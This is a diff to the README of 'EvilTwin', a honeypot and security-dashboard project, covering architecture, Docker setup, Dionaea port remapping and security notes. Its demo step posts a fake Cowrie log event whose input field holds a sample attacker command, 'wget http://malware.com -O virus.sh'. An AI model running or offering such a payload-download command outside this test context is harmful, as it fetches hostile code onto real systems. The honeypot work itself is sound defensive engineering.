@@ -7,7 +7,7 @@
 
 ## Architecture Overview
 
-```
+```text
                           ┌────────────────────────────┐
                           │   React Dashboard (:3000)  │
                           │   Live alerts · Maps · KPIs │
@@ -32,8 +32,8 @@
         └──────────┬───────────────┬───────────────────┘
                    │               │
           ┌────────▼──────┐  ┌─────▼─────────┐
-          │  Cowrie (SSH)  │  │ Dionaea (multi)│
-          │  :2222 → :22   │  │ :21, :80, :445 │
+           │  Cowrie (SSH)   │  │ Dionaea (multi)     │
+           │  :2222 → :22    │  │ :2121/:8081/:1445   │
           └───────────────┘  └───────────────┘
               deception-net (isolated)
 ```
@@ -54,7 +54,7 @@ cd EvilTwin
 cp .env.example .env
 ```
 
-Open the `.env` file and set the `POSTGRES_PASSWORD` to a secure string. By default, the other services are pre-configured to communicate via internal Docker networks. 
+Open the `.env` file and set the `POSTGRES_PASSWORD` to a secure string. By default, the other services are pre-configured to communicate via internal Docker networks.
 *(Optional)* If you have IPInfo, AbuseIPDB, or Splunk tokens, you can add them here to enable advanced VPN detection and SIEM forwarding.
 
 ### 2. Training the AI Model
@@ -74,7 +74,7 @@ cd ..
 
 ### 3. Running the Full Stack via Docker (Recommended)
 
-You can spawn the entire platform—the frontend dashboard, backend API, Ryu SDN controller, PostgreSQL database, and Dionaea/Cowrie honeypots—using a single command. 
+You can spawn the entire platform—the frontend dashboard, backend API, Ryu SDN controller, PostgreSQL database, and Dionaea/Cowrie honeypots—using a single command.
 
 ```bash
 docker compose up -d --build
@@ -84,7 +84,8 @@ docker compose up -d --build
 
 - `eviltwin-postgres` boots up on port 5432.
 - `eviltwin-backend` launches on port 8000 and connects to the database. It begins trailing the honeypot logs via mapped volumes.
-- `eviltwin-cowrie` (SSH) and `eviltwin-dionaea` (FTP/HTTP/SMB) boot silently on the isolated `deception-net`.
+- `eviltwin-cowrie` (SSH) and `eviltwin-dionaea` (FTP/HTTP/SMB) stay attached to the internal `deception-net` for backend communication and are also attached to a dedicated `honeypot-ingress` bridge so Docker can publish demo ports directly.
+- Dionaea is published on `2121 -> 21`, `8081 -> 80`, `1445 -> 445`, and `11433 -> 1433`.
 - `eviltwin-ryu` starts managing OpenFlow networking.
 - `eviltwin-frontend` starts serving the React SOC console on port 3000.
 
@@ -103,12 +104,13 @@ You are now looking at the **EvilTwin Live Threat Operations console**.
 To generate some visual activity on your new dashboard, you can trigger a fake attack event:
 
 1. Send a POST request directly to the log ingestion API acting as the Honeypot:
-   
+
    ```bash
    curl -X POST http://localhost:8000/log \
      -H "Content-Type: application/json" \
      -d '{"eventid":"cowrie.command.input","src_ip":"8.8.8.8","message":"Downloading payload","input":"wget http://malware.com -O virus.sh", "session":"test01", "protocol":"ssh"}'
    ```
+
 2. Check your Dashboard at **[http://localhost:3000](http://localhost:3000)**. You will immediately see the "Live Threat Feed" flash red, the Threat Level Gauge spike, and a new session appear in your Attack Maps.
 
 ### Alternative: Running the Frontend in Development Mode
@@ -121,11 +123,11 @@ npm install
 npm run dev
 ```
 
-Navigate to **http://localhost:5173**. *Note: Because the backend is offline, the tables and graphs will display empty/null states, and the WebSocket indicator in the Top Bar will read "Disconnected".*
+Navigate to [http://localhost:5173](http://localhost:5173). *Note: Because the backend is offline, the tables and graphs will display empty/null states, and the WebSocket indicator in the Top Bar will read "Disconnected".*
 
 ## 🎨 Showcase Mode (Dummy Data)
 
-If you want to demonstrate the platform's UI without booting up the honeypots or generating real attacks, you can enable **Showcase Mode**. This automatically populates the Dashboard statistics, 3D Map arcs, and generates dynamic live threat feed alerts. 
+If you want to demonstrate the platform's UI without booting up the honeypots or generating real attacks, you can enable **Showcase Mode**. This automatically populates the Dashboard statistics, 3D Map arcs, and generates dynamic live threat feed alerts.
 
 To enable it for the frontend:
 
@@ -135,15 +137,15 @@ To enable it for the frontend:
 
 ## Services
 
-| Service            | Port      | Description                                 |
-| ------------------ | --------- | ------------------------------------------- |
-| `postgres`         | 5432      | PostgreSQL 16 — attacker data store         |
-| `cowrie`           | 2222      | SSH honeypot (Cowrie)                       |
-| `dionaea`          | 21/80/445 | Multi-protocol honeypot (Dionaea)           |
-| `ryu`              | 6633/8080 | Ryu SDN controller + REST API               |
-| `backend`          | 8000      | FastAPI — ingest, scoring, sessions, alerts |
-| `frontend`         | 3000      | React SOC dashboard                         |
-| `splunk-forwarder` | —         | Splunk Universal Forwarder                  |
+| Service | Port | Description |
+| --- | --- | --- |
+| `postgres` | 5432 | PostgreSQL 16 — attacker data store |
+| `cowrie` | 2222 | SSH honeypot (Cowrie) |
+| `dionaea` | 2121/8081/1445/11433 | Multi-protocol honeypot (Dionaea) |
+| `ryu` | 6633/8080 | Ryu SDN controller + REST API |
+| `backend` | 8000 | FastAPI — ingest, scoring, sessions, alerts |
+| `frontend` | 3000 | React SOC dashboard |
+| `splunk-forwarder` | — | Splunk Universal Forwarder |
 
 ## API Endpoints
 
@@ -194,7 +196,7 @@ python -m ai.train
 
 ## Security Notes
 
-- Honeypots run on an **isolated Docker network** (`deception-net`, `internal: true`)
+- Honeypots use an **internal deception network** for backend communication and a dedicated ingress bridge for host-published demo ports
 - Honeypots **cannot reach** the internet or database directly
 - Backend reads logs via **volume mounts** (one-way)
 - All attacker data stored as **JSONB** — never interpolated into queries
